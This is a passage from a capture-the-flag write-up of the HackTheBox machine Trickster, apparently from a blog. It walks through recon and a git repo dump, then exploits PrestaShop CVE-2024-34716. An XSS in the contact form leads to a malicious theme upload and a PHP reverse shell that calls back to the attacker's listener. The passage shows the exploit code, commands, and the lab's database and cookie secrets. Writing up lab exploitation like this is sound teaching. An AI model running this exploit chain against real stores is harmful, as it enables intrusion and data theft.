---
title: HTB: Trickster
url: https://0xdf.gitlab.io/2025/02/01/htb-trickster.html
date: 2025-02-01T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-trickster, nmap, subdomain, ffuf, modsecurity, burp, burp-repeater, weppalyzer, git, git-dumper, source-code, prestashop, cve-2024-34716, xss, hashcat, changedetection, cve-2024-32651, ssti, brotli, prusaslicer, cve-2023-47268, htb-intuition
---

![Trickster](/img/trickster-cover.png)

Trickster starts with an instance of Prestashop. I’ll exploit an XSS to get admin access and a webshell to get execution. Database credentials work to pivot to the next user. From there, I’ll access a instance of ChangeDetection.IO, exploiting a SSTI vulnerability to get a shell in the container running it. In the data associated with the site, I’ll find another user’s password that works on the host machine. That user can run software associated with the Prusa 3D printer as root, which I’ll exploit to get root. In Beyond Root, I’ll look at ModSecurity and how it was blocking some tools used in initial enumeration by User-Agent string.

## Box Info

| Name | [Trickster](https://hackthebox.com/machines/trickster)  [Trickster](https://hackthebox.com/machines/trickster) [Play on HackTheBox](https://hackthebox.com/machines/trickster) |
| --- | --- |
| Release Date | [21 Sep 2024](https://twitter.com/hackthebox_eu/status/1836797435114373307) |
| Retire Date | 01 Feb 2025 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Trickster |
| Radar Graph | Radar chart for Trickster |
| First Blood User | 01:02:13[LukasReschke LukasReschke](https://app.hackthebox.com/users/1176175) |
| First Blood Root | 01:50:59[gumby gumby](https://app.hackthebox.com/users/187281) |
| Creator | [EmSec EmSec](https://app.hackthebox.com/users/962022) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.34
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-23 17:08 EDT
Nmap scan report for 10.10.11.34
Host is up (0.085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.83 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.34
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-23 17:08 EDT
Nmap scan report for 10.10.11.34
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)
|_  256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://trickster.htb/
Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.74 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 22.04 jammy.

There’s a redirect on HTTP to `trickster.htb`.

### Virtual Host Fuzz - TCP 80

Given the user of virtual host routing, I’ll use `ffuf` to scan for any subdomains of `trickster.htb` the response differently. I typically just us `-ac` to autofilter based on the “default response”, which finds nothing:

```

oxdf@hacky$ ffuf -u http://10.10.11.34 -H "Host: FUZZ.trickster.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.34
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.trickster.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 632 req/sec :: Duration: [0:00:22] :: Errors: 0 ::

```

In this case, the page has a link to `shop.trickster.htb`, which should definitely have come given that it’s in the used wordlist:

```

oxdf@hacky$ grep -n ^shop$ /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt 
37:shop

```

I’ll run without the filter and see what the default response looks like:

```

oxdf@hacky$ ffuf -u http://10.10.11.34 -H "Host: FUZZ.trickster.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.34
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.trickster.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

dns2                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 28ms]
ftp                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 30ms]
www                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 31ms]
secure                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 30ms]
test                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 31ms]
ns3                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 31ms]
m                       [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 32ms]
beta                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 32ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

The exact size is changing depending on the length of the input. Apache is printing the server name in the 301 output:

```

oxdf@hacky$ curl 10.10.11.34 -H "Host: free.trickster.htb"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://trickster.htb/">here</a>.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at free.trickster.htb Port 80</address>
</body></html>

```

My best guess is that the auto filter is filtering by words, as `shop` returns an Apache 403, which is also 20 words! Filtering by hiding anything with the “The document has moved” string does find `shop`:

```

oxdf@hacky$ ffuf -u http://10.10.11.34 -H "Host: FUZZ.trickster.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fr '<p>The document has moved <a href="http://trickster.htb/">here</a>.</p>'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.34
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.trickster.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: <p>The document has moved <a href="http://trickster.htb/">here</a>.</p>
________________________________________________

shop                    [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 47ms]
:: Progress: [19966/19966] :: Job [1/1] :: 778 req/sec :: Duration: [0:00:22] :: Errors: 0 ::

```

This ends up not being important here, as there’s a link to `shop.trickster.htb` on the main page, but it’s useful to know to be careful about where my tools and processes can fail.

The 403 Forbidden HTTP response code is a bit interesting too, as visiting the page in Firefox doesn’t show 403, but a page (same with `curl`). I’ll check repeater, and it seems the server is blocking FFUF user agent:

![image-20240923180408353](/img/image-20240923180408353.png)

If change the `User-Agent` header, it returns 200:

![image-20240923180429626](/img/image-20240923180429626.png)

I’ll identify that this block is ModSecurity and look at how it is configured in [Beyond Root](#beyond-root---modsecurity).

I’ll add these to my `hosts` file:

```
10.10.11.34 trickster.htb shop.trickster.htb

```

### trickster.htb - TCP 80

#### Site

The site is for an online retailer:

![image-20240923180532442](/img/image-20240923180532442.png)

The page is very short, and has pop-ups for almost all of the five links towards the bottom. “Shop” leads to `shop.trickster.htb`. The other four are largely fluff. There is a form on the “Contact” link:

![image-20240923180705998](/img/image-20240923180705998.png)

Submitting the form sends an HTTP POST to / with the content in the body, but there’s no indication that anyone is looking at it.

#### Tech Stack

The HTTP response headers show only that the server is Apache:

```

HTTP/1.1 200 OK
Date: Mon, 23 Sep 2024 22:08:36 GMT
Server: Apache/2.4.52 (Ubuntu)
Last-Modified: Tue, 17 Sep 2024 18:07:06 GMT
ETag: "318b-622548ea9c1bd-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 12683
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

```

The main page loads as `/index.html`, so this is likely a static site.

It’s always a good idea to re-scan the hosts by domain name with `nmap` so that the scripts can also interact with the domain name:

```

oxdf@hacky$ nmap -p 80 -sCV trickster.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-23 18:15 EDT
Nmap scan report for trickster.htb (10.10.11.34)
Host is up (0.024s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds

```

Interestingly, just like `ffuf`, it’s getting 403. Setting the `User-Agent` to something that isn’t blocked returns normally:

```

oxdf@hacky$ nmap -p 80 -sCV trickster.htb --script-args http.useragent="0xdf"
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-28 09:15 EST
Nmap scan report for trickster.htb (10.10.11.34)
Host is up (0.084s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Trickster
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.61 seconds

```

#### Directory Brute Force

I’ll run `feroxbuster` against the site. For some reason, a bunch of 503’s dump out, so I’ll add `-C 503` to explicitly hide those:

```

oxdf@hacky$ feroxbuster -u http://trickster.htb -x html -C 503

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://trickster.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [503]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      355l      927w    12683c http://trickster.htb/
[####################] - 3m     30014/30014   0s      found:1       errors:24
[####################] - 3m     30000/30000   200/s   http://trickster.htb/ 

```

The 503 Service Unavailable responses could be blocking, or it could be that the server is getting overwhelmed. Either way, it doesn’t find anything interesting.

### shop.trickster.htb

#### Site

This is the store associated with the company:

![image-20240923181730583](/img/image-20240923181730583.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

There’s a signin form, as well as a registration form. There’s a search function, cart, and checkout.

#### Tech Stack

The HTTP response headers still just show Apache:

```

HTTP/1.1 200 OK
Date: Mon, 23 Sep 2024 22:21:11 GMT
Server: Apache/2.4.52 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 101007
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=utf-8

```

`/index.php` returns a redirect to `/`, where as `/index.html` and `/index.[anything else]` returns the 404 page. That suggests this page may be PHP. The bottom of the page shows that it’s built with [PrestaShop](https://prestashop.com/):

![image-20240923182808831](/img/image-20240923182808831.png)

[Wappalyzer](https://www.wappalyzer.com/) agrees, also identifying PrestaShop as well as MySQL:

![image-20240923182639817](/img/image-20240923182639817.png)

When I scan this by hostname it find a Git repo:

```

oxdf@hacky$ nmap -p 80 -sCV shop.trickster.htb --script-args http.useragent="0xdf"
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-28 09:17 EST
Nmap scan report for shop.trickster.htb (10.10.11.34)
Host is up (0.084s latency).
rDNS record for 10.10.11.34: trickster.htb

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Trickster Store
| http-robots.txt: 79 disallowed entries (15 shown)
| /.git /*?order= /*?tag= /*?id_currency= 
| /*?search_query= /*?back= /*?n= /*&order= /*&tag= /*&id_currency= 
| /*&search_query= /*&back= /*&n= /*controller=addresses 
|_/*controller=address
| http-git: 
|   10.10.11.34:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: update admin pannel 
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.19 seconds

```

I’ve given it an unblocked `User-Agent`, but it will find the Git repo even without that.

I’ll skip the directory brute force and focus on the source.

### Shop Source Code

#### Fetch Repo

I’ll use [git-dumper](https://github.com/arthaud/git-dumper) to get the Git repo from the site:

```

oxdf@hacky$ mkdir git
oxdf@hacky$ cd git
oxdf@hacky$ git-dumper http://shop.trickster.htb .
[-] Testing http://shop.trickster.htb/.git/HEAD [200]
[-] Testing http://shop.trickster.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://shop.trickster.htb/.git/ [200]
[-] Fetching http://shop.trickster.htb/.git/logs/ [200]
[-] Fetching http://shop.trickster.htb/.git/branches/ [200]
[-] Fetching http://shop.trickster.htb/.git/description [200]
[-] Fetching http://shop.trickster.htb/.git/HEAD [200]
...[snip]...
[-] Fetching http://shop.trickster.htb/.git/objects/fd/d5344716673e0c8178094dd142e3440025eced [200]
[-] Fetching http://shop.trickster.htb/.git/objects/fd/e621e906ebb042dd56e2bba77324722fb9f705 [200]
[-] Fetching http://shop.trickster.htb/.git/objects/fd/faad2adc8219a055b1bb73d6995589c2ca3efb [200]
[-] Running git checkout .
Updated 1699 paths from the index

```

#### Source Analysis

Now I have the files from the repo:

```

oxdf@hacky$ ls
admin634ewutrx1jgitlooaj  error500.html  init.php                 INSTALL.txt  Makefile
autoload.php              index.php      Install_PrestaShop.html  LICENSES

```

Unfortunately, this seems to be only a partial set of the site. For example, `index.php` loads `config/config.inc.php`:

```

<?php
/**
 * Copyright since 2007 PrestaShop SA and Contributors
 * PrestaShop is an International Registered Trademark & Property of PrestaShop SA
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.md.
 * It is also available through the world-wide-web at this URL:
 * https://opensource.org/licenses/OSL-3.0
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@prestashop.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade PrestaShop to newer
 * versions in the future. If you wish to customize PrestaShop for your
 * needs please refer to https://devdocs.prestashop.com/ for more information.
 *
 * @author    PrestaShop SA and Contributors <contact@prestashop.com>
 * @copyright Since 2007 PrestaShop SA and Contributors
 * @license   https://opensource.org/licenses/OSL-3.0 Open Software License (OSL 3.0)
 */

require dirname(__FILE__).'/config/config.inc.php';
Dispatcher::getInstance()->dispatch();

```

But there is no `config` directory in the repo.

Visiting `/config` on the website returns a 403, which suggests it’s there but blocked.

The `INSTALL.txt` file does indicate this is PrestaShop 8, but doesn’t give a more specific version.

#### Admin

There is an admin directory:

```

oxdf@hacky$ ls admin634ewutrx1jgitlooaj/
autoupgrade    cron_currency_rates.php  filemanager     get-file-admin.php  index.php   themes
backups        export                   footer.inc.php  header.inc.php      init.php
bootstrap.php  favicon.ico              functions.php   import              robots.txt

```

That looks very similar to what’s in the `admin-dev` directory on the [PrestaShop GitHub](https://github.com/PrestaShop/PrestaShop/tree/develop/admin-dev):

![image-20240923184854105](/img/image-20240923184854105.png)

Visiting `/admin634ewutrx1jgitlooaj` presents the admin login page:

![image-20240924114032598](/img/image-20240924114032598.png)

The version is 8.1.5.

## Shell as www-data

### CVE-2024-34716

#### Identify

Searching for “Prestashop exploit” returns a bunch of different CVE references. The [Snyk page for PrestaShop](https://security.snyk.io/package/composer/prestashop%2Fprestashop) is useful for triaging:

![image-20240923190344680](/img/image-20240923190344680.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

The top two should in that list apply to 8.1.5, and the second one is of critical severity, and a good place to start.

#### Background

[CVE-2024-34716](https://security.snyk.io/vuln/SNYK-PHP-PRESTASHOPPRESTASHOP-6846214) is:

> Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via the front-office contact form. An attacker can execute arbitrary scripts in the context of the administrator’s session by uploading a malicious file that contains script code, which is then executed when an admin views the attachment in the back office.

[This blog post](https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/) from ayoubmokhtar.com goes into great detail of how this exploit works, including a link to a POC and a video showing how to turn this XSS into RCE.

The XSS is in the `/contact-us` page. It happens when there is JavaScript embedded in a PNG image, such that when the support victim looks at the image, it executes the JavaScript code.

The author of the post has taken that and used it to perform a cross-site request forgery (CSRF) against the PrestaShop admin panel, getting the necessary tokens and then uploading a malicious theme resulting in RCE.

The blog author’s POC is [here on GitHub](https://github.com/aelmokhtar/CVE-2024-34716?tab=readme-ov-file).

### POC Exploit

#### SetUp

I’ll clone the repo into my VM, create a virtual environment, and install the required packages:

```

oxdf@hacky$ git clone https://github.com/aelmokhtar/CVE-2024-34716.git
Cloning into 'CVE-2024-34716'...
remote: Enumerating objects: 28, done.
remote: Counting objects: 100% (28/28), done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 28 (delta 10), reused 20 (delta 7), pack-reused 0 (from 0)
Receiving objects: 100% (28/28), 6.70 MiB | 29.20 MiB/s, done.
Resolving deltas: 100% (10/10), done.
oxdf@hacky$ cd CVE-2024-34716/
oxdf@hacky$ python -m venv venv
oxdf@hacky$ source venv/bin/activate
(venv) oxdf@hacky$ pip install -r requirements.txt 
Collecting argparse (from -r requirements.txt (line 1))
  Downloading argparse-1.4.0-py2.py3-none-any.whl.metadata (2.8 kB)
Collecting beautifulsoup4 (from -r requirements.txt (line 2))
  Using cached beautifulsoup4-4.12.3-py3-none-any.whl.metadata (3.8 kB)
Collecting requests (from -r requirements.txt (line 3))
  Using cached requests-2.32.3-py3-none-any.whl.metadata (4.6 kB)
Collecting soupsieve>1.2 (from beautifulsoup4->-r requirements.txt (line 2))
  Using cached soupsieve-2.6-py3-none-any.whl.metadata (4.6 kB)
Collecting charset-normalizer<4,>=2 (from requests->-r requirements.txt (line 3))
  Using cached charset_normalizer-3.3.2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (33 kB)
Collecting idna<4,>=2.5 (from requests->-r requirements.txt (line 3))
  Using cached idna-3.10-py3-none-any.whl.metadata (10 kB)
Collecting urllib3<3,>=1.21.1 (from requests->-r requirements.txt (line 3))
  Using cached urllib3-2.2.3-py3-none-any.whl.metadata (6.5 kB)
Collecting certifi>=2017.4.17 (from requests->-r requirements.txt (line 3))
  Using cached certifi-2024.8.30-py3-none-any.whl.metadata (2.2 kB)
Downloading argparse-1.4.0-py2.py3-none-any.whl (23 kB)
Using cached beautifulsoup4-4.12.3-py3-none-any.whl (147 kB)
Using cached requests-2.32.3-py3-none-any.whl (64 kB)
Using cached certifi-2024.8.30-py3-none-any.whl (167 kB)
Using cached charset_normalizer-3.3.2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (141 kB)
Using cached idna-3.10-py3-none-any.whl (70 kB)
Using cached soupsieve-2.6-py3-none-any.whl (36 kB)
Using cached urllib3-2.2.3-py3-none-any.whl (126 kB)
Installing collected packages: argparse, urllib3, soupsieve, idna, charset-normalizer, certifi, requests, beautifulsoup4
Successfully installed argparse-1.4.0 beautifulsoup4-4.12.3 certifi-2024.8.30 charset-normalizer-3.3.2 idna-3.10 requests-2.32.3 soupsieve-2.6 urllib3-2.2.3

```

The repo has a bunch of files:

```

oxdf@hacky$ ls
exploit.html  exploit.py  ps_next_8_theme_malicious.zip  README.md  requirements.txt  reverse_shell.php  venv

```

This is a pretty bad POC, but at the time of Trickster’s release, it was the only POC available. There are likely better ones available now. I don’t mean that to insult the author, but it has a ton of moving pieces, and it requires a good bit of editing to get it to work. It does things that the user could do fairly easily (starting a webserver to host a file or `nc` to catch a reverse shell), but not others that it could do easily that are hard for the user, like editing inside a zip file. It prints out things like listening on port X when it’s actually listening on port Y. Getting this working is a bit tricky.

#### exploit.py

The `exploit.py` file is going to generate the XSS, taking a given `.html` file and submitting it as an attachment in the contact form as a PNG. First it has to get the CSRF token and cookie from the page:

```

    url = f"{host_url}/contact-us"

    response = requests.get(url)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find('input', {'name': 'token'})['value']
    cookies = response.cookies

```

Then it submits the XSS:

```

    files = {
        'fileUpload': ('test.png', html_content, 'image/png'),
    }

    data = {
        'id_contact': '2',
        'from': email,
        'message': message_content,
        'url': '',
        'token': token,
        'submitMessage': 'Send'
    }

    response = requests.post(url, files=files, data=data, cookies=cookies)

```

Then it polls the expected location of the uploaded theme webshell until it finds a reverse shell.

#### exploit.html

The `exploit.html` file has some fixed variables at the top:

```

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta viewport="width=device-width, initial-scale=1.0">
    <title>Exploit</title>
</head>
<body>
    <script>
        const baseUrl = 'http://shop.trickster.htb';
        const path = 'admin634ewutrx1jgitlooaj';
        const httpServerIp = '10.10.14.6';
        const httpServerPort = 80;
        const fileNameOfTheme = "ps_next_8_theme_malicious.zip";

```

I’ve updated these to the match the situation here.

At the bottom of the script, it waits for the page to load and then calls `importTheme`, and the rest of the code is just JavaScript that handles doing that, including getting the admin’s token and CSRF token.

#### ps\_next\_8\_theme\_malicious.zip

The theme includes [this common PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell). I’ll need to update the IP and port for it to work. This archive contains a lot of files, including some that start with `.` that may not be re-zipped. I learned doing this box that `vim` can edit files inside zips:

> TIL: vim can edit files inside a zip archive. Just `vim [archive name]` and it'll provide a list of files. Select one, edit it, save, and it is now changed!
>
> — 0xdf (@0xdf\_) [September 24, 2024](https://twitter.com/0xdf_/status/1838647889343451491?ref_src=twsrc%5Etfw)

I’ll do that here and edit `reverse_shell.php`, deleting all the comments at the top and setting the IP and port:

```

<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.6';  // CHANGE THIS
$port = 9001;       // CHANGE THIS
...[snip]...

```

#### Execution

I’ll need a `nc` listener on the port I set in `reverse_shell.php` (in my case 9001), and a web server hosting the theme archive on the post specified in `exploit.html` (in my case 80). With both those running, I’ll run `exploit.py`:

```

(venv) oxdf@hacky$ python exploit.py http://shop.trickster.htb 0xdf@trickster.htb "please help" exploit.html 
[X] Starting exploit with:
        Url: http://shop.trickster.htb
        Email: 0xdf@trickster.htb
        Message: please help
        Exploit path: exploit.html
[X] Yay! Your exploit was sent successfully!
[X] Remember to python http server on port whatever port is specified in exploit.html 
        in directory that contains ps_next_8_theme_malicious.zip to host it.
[X] Once a CS agent clicks on attachment, you'll get a SHELL!
[X] Ncat is now listening on port 1234. Press Ctrl+C to terminate.
Serving at http.Server on port 5000
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:1667
Ncat: Listening on 0.0.0.0:1667
GET request to http://shop.trickster.htb/themes/next/reverse_shell.php: 403
GET request to http://shop.trickster.htb/themes/next/reverse_shell.php: 403
GET request to http://shop.trickster.htb/themes/next/reverse_shell.php: 200

```

It starts by uploading the XSS payload. It prints a bunch of wrong information about ports for `nc` and `http.server`, which is fine as I’ve got my own running. Then it goes into a loop trying to trigger the reverse shell. The first two return 403 forbidden, as the exploit hasn’t run. Once the agent (automation) views the XSS, there’s a request on my webserver:

```
10.10.11.34 - - [24/Sep/2024 14:38:02] "GET /ps_next_8_theme_malicious.zip HTTP/1.1" 200 -

```

The next request above shows 200, as it found the webshell, and then there’s a shell at `nc`:

```

oxdf@hacky$ nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.34 59308
Linux trickster 5.15.0-121-generic #131-Ubuntu SMP Fri Aug 9 08:29:53 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 18:38:38 up  7:49,  0 users,  load average: 0.11, 0.18, 0.17
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@trickster:/$ ^Z
[1]+  Stopped                 nc -lnvp 9001
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 9001
             ‍reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@trickster:/$ 

```

## Shell as james

### Enumeration

#### Users

There are three users on Trickster with home directories:

```

www-data@trickster:/home$ ls
adam  james  runner

```

www-data can’t enter or read from any of them. These users match the list of users with shells in `passwd`:

```

www-data@trickster:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
james:x:1000:1000:trickster:/home/james:/bin/bash
adam:x:1002:1002::/home/adam:/bin/bash
runner:x:1003:1003::/home/runner:/bin/sh

```

#### Web Directories

There are three directories in `/var/www`:

```

www-data@trickster:~$ ls
html  prestashop  trickster

```

`html` just has the default Apache `index.html` page.

`trickster` has the static `index.html` for the main site:

```

www-data@trickster:~$ ls trickster/
assets  images  index.html

```

There’s nothing else interesting in there.

`prestashop` has the complete code for the shop:

```

www-data@trickster:~$ ls prestashop/
INSTALL.txt               classes        init.php           src
Install_PrestaShop.html   composer.lock  js                 templates
LICENSES                  config         localization       themes
Makefile                  controllers    mails              tools
admin634ewutrx1jgitlooaj  docs           modules            translations
app                       download       override           upload
autoload.php              error500.html  pdf                var
bin                       img            phpstan.neon.dist  vendor
cache                     index.php      robots.txt         webservice

```

The [PrestaShop docs](https://devdocs.prestashop-project.org/8/development/configuration/configuring-prestashop/) show that the configuration data is stored in a few places:

![image-20240924151256150](/img/image-20240924151256150.png)

The database connection information is at the top of `parameters.php`:

```

<?php return array (
  'parameters' =>
  array (
    'database_host' => '127.0.0.1',
    'database_port' => '',
    'database_name' => 'prestashop',
    'database_user' => 'ps_user',
    'database_password' => 'prest@shop_o',
    'database_prefix' => 'ps_',
    'database_engine' => 'InnoDB',
    'mailer_transport' => 'smtp',
    'mailer_host' => '127.0.0.1',
    'mailer_user' => NULL,
    'mailer_password' => NULL,
    'secret' => 'eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog',
    'ps_caching' => 'CacheMemcache',
    'ps_cache_enable' => false,
    'ps_creation_date' => '2024-05-25',
    'locale' => 'en-US',
    'use_debug_toolbar' => true,
    'cookie_key' => '8PR6s1SJZLPCjXTegH7fXttSAXbG2h6wfCD3cLk5GpvkGAZ4K9hMXpxBxrf7s42i',
    'cookie_iv' => 'fQoIWUoOLU0hiM2VmI1KPY61DtUsUx8g',
    'new_cookie_key' => 'def000001a30bb7f2f22b0a7790f2268f8c634898e0e1d32444c3a03f4040bd5e8cb44bdb57a73f70e01cf83a38ec5d2ddc1741476e83c45f97f763e7491cc5e002aff47',
    'api_public_key' => '-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuSFQP3xrZccKbS/VGKMr
v8dF4IJh9F9NvmPZqiFNpJnBHhfWE3YVM/OrEREGKztkHFsQGUZXFIwiBQVs5kAG
5jfw+hQrl89+JRD0ogZ+OHUfN/CgmM2eq1H/gxAYfcRfwjSlOh2YzAwpLvwtYXBt
Scu6QqRAdotokqW2m3aMt+LV8ERdFsBkj+/OVdJ8oslvSt6Kgf39DnBpGIXAqaFc
